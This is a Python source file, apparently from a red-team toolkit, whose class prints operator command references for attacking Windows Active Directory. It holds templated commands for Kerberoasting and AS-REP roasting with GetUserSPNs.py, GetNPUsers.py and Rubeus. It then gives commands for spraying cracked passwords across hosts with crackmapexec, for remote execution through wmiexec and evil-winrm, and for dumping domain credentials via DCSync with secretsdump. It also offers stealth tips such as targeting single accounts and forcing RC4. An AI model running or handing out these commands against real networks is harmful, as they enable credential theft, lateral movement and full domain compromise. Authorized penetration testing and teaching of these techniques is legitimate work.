"""
Command Reference — Prints alternative roasting methods
and post-exploitation password validation commands.
"""


class CommandReference:
    """Static command reference printer for operator guidance."""

    @staticmethod
    def print_alternatives(domain: str, username: str, password: str, dc_ip: str):
        """Print alternative Kerberoast/AS-REP tools for Linux and Windows."""
        print(f"""
[Kerberoasting — From Linux]
  GetUserSPNs.py {domain}/{username}:{password} \\
    -dc-ip {dc_ip} -request -outputfile kerberoast.txt

  # Target specific user (stealthier)
  GetUserSPNs.py {domain}/{username}:{password} \\
    -dc-ip {dc_ip} -request-user svc_target

[Kerberoasting — From Windows]
  Rubeus.exe kerberoast /outfile:hashes.txt
  Rubeus.exe kerberoast /user:svc_target /outfile:hash.txt
  Rubeus.exe kerberoast /tgtdeleg /outfile:hashes.txt   # Force RC4

[AS-REP Roasting — From Linux]
  GetNPUsers.py {domain}/ -usersfile users.txt \\
    -dc-ip {dc_ip} -format hashcat -outputfile asrep.txt

[AS-REP Roasting — From Windows]
  Rubeus.exe asreproast /outfile:asrep_hashes.txt
""")

    @staticmethod
    def print_validation(domain: str, dc_ip: str):
        """Print post-crack password validation and exploitation commands."""
        print(f"\n{'=' * 60}")
        print("PHASE 4: PASSWORD VALIDATION & EXPLOITATION")
        print(f"{'=' * 60}")

        print(f"""
[*] After cracking, validate each password:

    # Single credential test
    crackmapexec smb {dc_ip} -d {domain} -u <user> -p '<pass>'

    # Check local admin on all domain computers
    crackmapexec smb targets.txt -d {domain} -u <user> -p '<pass>'

    # Test password reuse (RESPECT LOCKOUT POLICY!)
    # First check: net accounts /domain
    crackmapexec smb {dc_ip} -d {domain} -u users.txt -p '<pass>' --continue-on-success

[*] If cracked account has admin rights:
    wmiexec.py {domain}/<user>:'<pass>'@<target>
    evil-winrm -i <target> -u <user> -p '<pass>'

[*] If cracked account has DCSync rights:
    secretsdump.py {domain}/<user>:'<pass>'@{dc_ip} -just-dc
""")